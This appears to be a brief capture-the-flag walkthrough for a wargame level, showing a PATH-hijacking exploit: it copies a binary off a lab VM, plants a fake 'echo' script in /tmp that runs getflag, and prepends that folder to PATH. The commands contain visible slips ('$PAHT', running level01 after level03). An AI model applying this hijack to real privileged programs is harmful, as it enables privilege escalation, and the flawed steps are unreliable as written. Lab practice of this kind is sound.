# Download file and inspect the code with Ghidra
`scp -P 4242 level03@<VM address>:level03 .`

# Exploit call to echo with no absolut path by creating or custom script
```bash
mkdir /tmp/lol
cat > /tmp/lol/echo
#!/bin/bash
getflag
<ctrl + D>
chmod 777 /tmp/lol/echo
export PATH="/tmp/lol:$PAHT"
```

# Get the flag
`./level01`
